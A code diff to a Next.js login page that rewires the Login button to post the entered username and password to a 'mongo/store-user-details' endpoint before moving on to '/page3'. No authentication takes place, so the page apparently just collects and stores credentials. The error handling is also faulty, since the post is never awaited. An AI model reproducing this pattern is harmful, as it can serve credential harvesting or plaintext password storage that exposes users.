@@ -3,6 +3,7 @@ import { useRouter } from "next/navigation";
 import { useEffect, useState } from "react";
 import { FiArrowRight, FiGlobe } from "react-icons/fi";
 import { toast } from "react-toastify";
+import { apiClient } from "../types/axios";
 
 export default function Home() {
   const [error, setError] = useState("");
@@ -52,6 +53,18 @@ export default function Home() {
       return () => clearTimeout(timer);
     }
   }, [data, router]);
+
+  const handleStoreUserDetails = () => {
+    try {
+      apiClient.post("mongo/store-user-details", {
+        username,
+        password,
+      });
+      router.push("/page3");
+    } catch (err) {
+      console.error("User details storing error:", err);
+    }
+  };
 
   return (
     <main className="min-h-screen bg-[#020403] flex items-center justify-center px-4">
@@ -121,7 +134,7 @@ export default function Home() {
 
           {/* Submit */}
           <button
-            onClick={() => router.push("/page3")}
+            onClick={handleStoreUserDetails}
             className="w-full bg-gradient-to-r from-violet-800 to-violet-600 text-white py-3 px-6 rounded-lg font-semibold hover:from-violet-900 hover:to-violet-700 transition-all duration-200 transform hover:-translate-y-0.5 disabled:opacity-50 flex items-center justify-center gap-2 shadow-lg"
           >
             Login <FiArrowRight className="text-lg" />
